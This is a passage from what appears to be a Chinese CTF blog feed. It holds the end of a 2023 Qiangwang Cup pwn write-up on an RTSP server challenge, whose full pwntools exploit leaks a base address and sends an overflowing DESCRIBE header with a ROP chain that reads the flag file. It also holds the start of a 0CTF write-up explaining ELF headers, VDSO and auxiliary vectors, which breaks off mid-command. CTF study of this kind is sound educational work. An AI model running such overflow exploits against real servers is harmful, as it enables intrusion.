src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/backdoor3.png" class title="backdoor3"></li></ul><h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h2><ul><li><p>wavAudioTest相关的操作要先SETUP</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/session.png" class title="session"></li><li><p>GET_PARAMETER如果是对wavAudioTest操作实际调用的不是RTSPClientConnection对象的handleCmd_GET_PARAMETER而不是RTSPClientSession对象的</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/client.png" class title="client"><p>分别调用两个函数的调用栈</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/clientconnection.png" class title="clientconnection"><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/clientsession.png" class title="clientsession"><p>判断在handleRequestBytes函数中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs cpp">     <span class="hljs-keyword">if</span> (urlIsRTSPS != fOurRTSPServer.fOurConnectionsUseTLS) &#123;<br>         <br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;OPTIONS&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>  <br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (urlPreSuffix[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span> &amp;&amp; urlSuffix[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;*&#x27;</span> &amp;&amp; urlSuffix[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br><span class="hljs-comment">// The special &quot;*&quot; URL means: an operation on the entire server.  This works only for GET_PARAMETER and SET_PARAMETER:</span><br>           <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;GET_PARAMETER&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>             <span class="hljs-built_in">handleCmd_GET_PARAMETER</span>((<span class="hljs-type">char</span> <span class="hljs-type">const</span>*)fRequestBuffer); <span class="hljs-comment">// RTSPClientConnection对象</span><br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;SET_PARAMETER&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>             <span class="hljs-built_in">handleCmd_SET_PARAMETER</span>((<span class="hljs-type">char</span> <span class="hljs-type">const</span>*)fRequestBuffer);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>             <span class="hljs-built_in">handleCmd_notSupported</span>();<br>           &#125;<br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;DESCRIBE&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">handleCmd_DESCRIBE</span>(urlPreSuffix, urlSuffix, (<span class="hljs-type">char</span> <span class="hljs-type">const</span>*)fRequestBuffer);<br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;SETUP&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>  <br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;TEARDOWN&quot;</span>) == <span class="hljs-number">0</span><br> || <span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;PLAY&quot;</span>) == <span class="hljs-number">0</span><br> || <span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;PAUSE&quot;</span>) == <span class="hljs-number">0</span><br> || <span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;GET_PARAMETER&quot;</span>) == <span class="hljs-number">0</span><br> || <span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;SET_PARAMETER&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>           <span class="hljs-keyword">if</span> (clientSession != <span class="hljs-literal">NULL</span>) &#123;<br>             clientSession-&gt;<span class="hljs-built_in">handleCmd_withinSession</span>(<span class="hljs-keyword">this</span>, cmdName, urlPreSuffix, urlSuffix, (<span class="hljs-type">char</span> <span class="hljs-type">const</span>*)fRequestBuffer); <span class="hljs-comment">// RTSPClientSession对象</span><br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>             <span class="hljs-built_in">handleCmd_sessionNotFound</span>();<br>           &#125;<br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;REGISTER&quot;</span>) == <span class="hljs-number">0</span> || <span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;DEREGISTER&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>  <br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>  <br>     &#125;<br></code></pre></td></tr></table></figure></li><li><p>DESCRIBE方法只能对wavAudioTest操作</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/describe.png" class title="describe"></li></ul><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br>p=remote(<span class="hljs-string">&#x27;192.168.111.143&#x27;</span>,<span class="hljs-number">8554</span>)<br>shellcode=<span class="hljs-string">b&#x27;SETUP rtsp://192.168.111.143:8554/wavAudioTest RTSP/1.0\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;CSeq: 1\r\n\r\n&#x27;</span><br>p.send(shellcode)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Session: &#x27;</span>)<br>session=p.recvuntil(<span class="hljs-string">b&#x27;;&#x27;</span>)[:-<span class="hljs-number">1</span>]<br><br>shellcode=<span class="hljs-string">b&#x27;GET_PARAMETER rtsp://192.168.111.143:8554/* RTSP/1.0\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;Session: &#x27;</span>+session+<span class="hljs-string">b&#x27;\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;CSeq: 1\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;GET_INFO: 2023\r\n\r\n&#x27;</span><br>p.send(shellcode)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;100 maybe you need this 0x&#x27;</span>)<br>codebase=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">0x2A9990</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(codebase))<br><br>shellcode=<span class="hljs-string">b&#x27;SET_PARAMETER rtsp://192.168.111.143:8554/* RTSP/1.0\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;Session: &#x27;</span>+session+<span class="hljs-string">b&#x27;\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;CSeq: 1\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;DESCRIBE_FLAG: qwb\r\n\r\n&#x27;</span><br>p.send(shellcode)<br><br>rdi=codebase+<span class="hljs-number">0x7b133</span><br>rsi=codebase+<span class="hljs-number">0x99fb0</span><br>rdx=codebase+<span class="hljs-number">0x19eaa</span><br>rax=codebase+<span class="hljs-number">0x35e4a</span><br>flag=codebase+<span class="hljs-number">0x7B3E5</span><br>read=codebase+<span class="hljs-number">0x18200</span><br>syscall=codebase+<span class="hljs-number">0x19EAC</span><br>gift=codebase+<span class="hljs-number">0x2a9990</span><br><br>shellcode=<span class="hljs-string">b&#x27;DESCRIBE rtsp://192.168.111.143:8554/wavAudioTest RTSP/1.0\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;Session: &#x27;</span>+session+<span class="hljs-string">b&#x27;\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;CSeq: 1\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;vul_string: &#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">396</span>+p32(<span class="hljs-number">0x198</span>)+p32(<span class="hljs-number">0x1f4</span>)+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br><br>shellcode+=p64(rdi)+p64(flag)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">2</span>)+p64(syscall)<br>shellcode+=p64(rdi)+p64(<span class="hljs-number">7</span>)+p64(rsi)+p64(gift)+p64(rdx)+p64(<span class="hljs-number">0x50</span>)+p64(read)<br>shellcode+=p64(rdi)+p64(<span class="hljs-number">5</span>)+p64(rsi)+p64(gift)+p64(rdx)+p64(<span class="hljs-number">0x50</span>)+p64(rax)+p64(<span class="hljs-number">1</span>)+p64(syscall)<br><br>shellcode+=<span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span><br>p.send(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023 0CTF 无中生有系列</title>
    <link href="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/"/>
    <url>/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/</url>
    
    <content type="html"><![CDATA[<p>在TCTF决赛被无中生有折磨之后第二天在0CTF再次被暴击，复现来了</p><span id="more"></span><h1 id="一些基础知识"><a href="#一些基础知识" class="headerlink" title="一些基础知识"></a>一些基础知识</h1><p>一些链接装载与库的复习</p><h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h2><p>就是这个玩意</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/elfheader.png" class title="elfheader"><p>EFF header结构体（64位）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>e_ident[EI_NIDENT];<span class="hljs-comment">/* Magic number and other info */</span><br>  Elf64_Halfe_type;<span class="hljs-comment">/* Object file type */</span><br>  Elf64_Halfe_machine;<span class="hljs-comment">/* Architecture */</span><br>  Elf64_Worde_version;<span class="hljs-comment">/* Object file version */</span><br>  Elf64_Addre_entry;<span class="hljs-comment">/* Entry point virtual address */</span><br>  Elf64_Offe_phoff;<span class="hljs-comment">/* Program header table file offset */</span><br>  Elf64_Offe_shoff;<span class="hljs-comment">/* Section header table file offset */</span><br>  Elf64_Worde_flags;<span class="hljs-comment">/* Processor-specific flags */</span><br>  Elf64_Halfe_ehsize;<span class="hljs-comment">/* ELF header size in bytes */</span><br>  Elf64_Halfe_phentsize;<span class="hljs-comment">/* Program header table entry size */</span><br>  Elf64_Halfe_phnum;<span class="hljs-comment">/* Program header table entry count */</span><br>  Elf64_Halfe_shentsize;<span class="hljs-comment">/* Section header table entry size */</span><br>  Elf64_Halfe_shnum;<span class="hljs-comment">/* Section header table entry count */</span><br>  Elf64_Halfe_shstrndx;<span class="hljs-comment">/* Section header string table index */</span><br>&#125; Elf64_Ehdr;<br></code></pre></td></tr></table></figure><ul><li><p>e_ident：ELF magic number</p></li><li><p>e_type：ELF类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_NONE0<span class="hljs-comment">/* No file type */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_REL1<span class="hljs-comment">/* 可重定位文件（.o文件） */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_EXEC2<span class="hljs-comment">/* 可执行文件（静态链接文件） */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_DYN3<span class="hljs-comment">/* 动态库文件（动态链接文件和共享库文件） */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_CORE4<span class="hljs-comment">/* 核心转储文件（core） */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>ET_NUM5<span class="hljs-comment">/* Number of defined types */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_LOOS0xfe00<span class="hljs-comment">/* OS-specific range start */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_HIOS0xfeff<span class="hljs-comment">/* OS-specific range end */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_LOPROC0xff00<span class="hljs-comment">/* Processor-specific range start */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_HIPROC0xffff<span class="hljs-comment">/* Processor-specific range end */</span></span><br></code></pre></td></tr></table></figure></li><li><p>e_machine：架构（太多了不列了）</p></li><li><p>e_version：ELF版本信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_NONE0<span class="hljs-comment">/* Invalid ELF version */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_CURRENT1<span class="hljs-comment">/* 一般用这个 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_NUM2</span><br></code></pre></td></tr></table></figure></li><li><p>e_entry：执行入口地址</p></li><li><p>e_phoff：段表的偏移</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/%E6%AE%B5%E8%A1%A8.png" class title="段表"></li><li><p>e_shoff：节表的偏移（在ELF尾部）</p></li><li><p>e_flags：处理器标志</p></li><li><p>e_ehsize：ELF header大小</p></li><li><p>e_phentsize：段表每一项的大小</p></li><li><p>e_phnum：段表项数</p></li><li><p>e_shentsize：节表每一项的大小</p></li><li><p>e_shnum：节表项数</p></li><li><p>e_shstrndx：section header string table index</p></li></ul><h2 id="Program-Header-Table"><a href="#Program-Header-Table" class="headerlink" title="Program Header Table"></a>Program Header Table</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Wordp_type;<span class="hljs-comment">/* Segment type */</span><br>  Elf64_Wordp_flags;<span class="hljs-comment">/* Segment flags */</span><br>  Elf64_Offp_offset;<span class="hljs-comment">/* Segment file offset */</span><br>  Elf64_Addrp_vaddr;<span class="hljs-comment">/* Segment virtual address */</span><br>  Elf64_Addrp_paddr;<span class="hljs-comment">/* Segment physical address */</span><br>  Elf64_Xwordp_filesz;<span class="hljs-comment">/* Segment size in file */</span><br>  Elf64_Xwordp_memsz;<span class="hljs-comment">/* Segment size in memory */</span><br>  Elf64_Xwordp_align;<span class="hljs-comment">/* Segment alignment */</span><br>&#125; Elf64_Phdr;<br></code></pre></td></tr></table></figure><ul><li><p>p_type：段类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span>PT_NULL0<span class="hljs-comment">/* 未使用 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_LOAD1<span class="hljs-comment">/* 可加载段，p_filesz表示段大小，p_memsz表示内存大小 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_DYNAMIC2<span class="hljs-comment">/* 动态链接信息 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_INTERP3<span class="hljs-comment">/* 解释器路径 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_NOTE4<span class="hljs-comment">/* 附加信息的位置和大小 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_SHLIB5<span class="hljs-comment">/* 保留 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_PHDR6<span class="hljs-comment">/* ELF Header大小位置 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_TLS7<span class="hljs-comment">/* Thread-local storage segment */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>PT_NUM8<span class="hljs-comment">/* Number of defined types */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_LOOS0x60000000<span class="hljs-comment">/* Start of OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_GNU_EH_FRAME0x6474e550<span class="hljs-comment">/* GCC .eh_frame_hdr segment */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_GNU_STACK0x6474e551<span class="hljs-comment">/* Indicates stack executability */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_GNU_RELRO0x6474e552<span class="hljs-comment">/* Read-only after relocation */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_GNU_PROPERTY0x6474e553<span class="hljs-comment">/* GNU property */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_LOSUNW0x6ffffffa</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_SUNWBSS0x6ffffffa<span class="hljs-comment">/* Sun Specific segment */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_SUNWSTACK0x6ffffffb<span class="hljs-comment">/* Stack segment */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_HISUNW0x6fffffff</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_HIOS0x6fffffff<span class="hljs-comment">/* End of OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_LOPROC0x70000000<span class="hljs-comment">/* Start of processor-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_HIPROC0x7fffffff<span class="hljs-comment">/* End of processor-specific */</span></span><br></code></pre></td></tr></table></figure></li><li><p>p_flags：段权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_X(1 &lt;&lt; 0)<span class="hljs-comment">/* Segment is executable */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_W(1 &lt;&lt; 1)<span class="hljs-comment">/* Segment is writable */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_R(1 &lt;&lt; 2)<span class="hljs-comment">/* Segment is readable */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_MASKOS0x0ff00000<span class="hljs-comment">/* OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_MASKPROC0xf0000000<span class="hljs-comment">/* Processor-specific */</span></span><br></code></pre></td></tr></table></figure></li><li><p>p_vaddr：段虚拟地址</p></li><li><p>p_paddr：段物理地址</p></li><li><p>p_filesz：文件镜像中段大小</p></li><li><p>p_memsz：内存镜像中段大小</p></li><li><p>p_align：对齐相关信息</p></li></ul><h2 id="VDSO"><a href="#VDSO" class="headerlink" title="VDSO"></a>VDSO</h2><p>x86-32使用 <strong>int 0x80</strong> 系统调用，但执行速度很慢，为了加快速度</p><ul><li><strong>Intel</strong>先实现了快速系统调用指令 <strong>sysenter</strong> 和 <strong>sysexit</strong></li><li><strong>AMD</strong>后实现了快速系统调用指令 <strong>syscall</strong> 和 <strong>sysret</strong></li></ul><p>x86-64统一使用 <strong>syscall</strong> 和 <strong>sysret</strong>，Intel同时支持两种方式</p><ul><li><p>厂商芯片斗争的结果就是不同的芯片需要使用不同的快速系统调用指令，因此开发了 <strong>vsyscall</strong> 机制，即glibc通过调用 <strong>__kernel_vsyscall</strong> 来确定到底应该执行什么指令</p><p><strong>__kernel_vsyscall</strong> 是一个特殊的页，位于内核地址空间（唯一允许用户访问的内核空间），该区域的地址固定为0xffffffffff600000（64位）</p></li><li><p><strong>vsyscall</strong> 还有一个重要的作用就是加快某些系统调用的速度</p><p>比如有些系统调用只需要读取一些数据进行计算，可以定期将这些数据推送到内核和用户空间的共享内存中，再利用 <strong>__kernel_vsyscall</strong> 读取计算，相当于将系统调用变成了函数调用，提高效率效果显著</p></li></ul><p>但 <strong>vsyscall</strong> 存在一些问题</p><ul><li>地址固定，容易成为ret2libc的跳板</li><li>支持的系统调用有限，且不易扩展</li></ul><p>所以有了 <strong>VDSO</strong></p><ul><li><strong>VDSO</strong> 本质上是一个ELF共享目标文件；而 <strong>vsyscall</strong> 只是一段内存代码和数据。</li><li><strong>vsyscall</strong> 位于内核地址空间，采用静态地址映射方式；而 <strong>VDSO</strong> 借助共享目标文件天生具有的PIC特性，可以以进程为粒度动态映射到进程地址空间中</li></ul><h2 id="Auxiliary-Vector"><a href="#Auxiliary-Vector" class="headerlink" title="Auxiliary Vector"></a>Auxiliary Vector</h2><p>辅助信息数组，用来在ld初始工作，没有完善的运行环境时，提供一些提示性的信息，在栈上（envp之后）</p><p>相关结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">uint64_t</span> a_type;<span class="hljs-comment">/* Entry type */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-type">uint64_t</span> a_val;<span class="hljs-comment">/* Integer value */</span><br>      <span class="hljs-comment">/* We use to have pointer elements added here.  We cannot do that,</span><br><span class="hljs-comment"> though, since it does not work when using 32-bit definitions</span><br><span class="hljs-comment"> on 64-bit platforms and vice versa.  */</span><br>    &#125; a_un;<br>&#125; Elf64_auxv_t;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_NULL0<span class="hljs-comment">/* End of vector */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_IGNORE1<span class="hljs-comment">/* Entry should be ignored */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_EXECFD2<span class="hljs-comment">/* ld可能利用操作系统的读写功能访问ELF，这是ELF的fd */</span></span><br>   <span class="hljs-comment">/* ld也可能直接将ELF映射进内存，这时候为了提供空间就需要以下几项 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_PHDR3<span class="hljs-comment">/* Program Header Table的地址 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_PHENT4<span class="hljs-comment">/* Size of program header entry */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_PHNUM5<span class="hljs-comment">/* Number of program headers */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_PAGESZ6<span class="hljs-comment">/* System page size */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_BASE7<span class="hljs-comment">/* Base address of interpreter */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_FLAGS8<span class="hljs-comment">/* Flags */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_ENTRY9<span class="hljs-comment">/* Entry point of program */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_NOTELF10<span class="hljs-comment">/* Program is not ELF */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_UID11<span class="hljs-comment">/* Real uid */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_EUID12<span class="hljs-comment">/* Effective uid */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_GID13<span class="hljs-comment">/* Real gid */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_EGID14<span class="hljs-comment">/* Effective gid */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_CLKTCK17<span class="hljs-comment">/* Frequency of times() */</span></span><br></code></pre></td></tr></table></figure><h2 id="sysenter"><a href="#sysenter" class="headerlink" title="sysenter"></a>sysenter</h2><p><em>qemu调sysenter选一个Intel的cpu就行了，比如Broadwell-v1</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 -cpu 